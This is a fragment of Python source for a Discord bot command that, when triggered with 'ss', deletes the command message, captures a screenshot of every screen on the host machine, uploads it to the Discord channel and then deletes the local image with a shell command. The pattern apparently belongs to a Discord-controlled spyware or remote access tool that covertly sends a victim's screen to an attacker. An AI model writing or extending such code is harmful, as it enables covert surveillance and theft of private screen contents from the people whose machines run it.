import subprocess
from PIL import ImageGrab

@client.command(name="ss")
async def screenshot(ctx):
    await ctx.message.delete()
    ImageGrab.grab(all_screens=True).save('ss.png')
    await ctx.message.channel.send(embed=discord.Embed(title=current_time() + '`[On demand]`', color=0x0084ff).set_image(url='attachment://ss.png'), file=discord.File(f'ss.png'))
    subprocess.run(f'del /s ss.png', shell=True)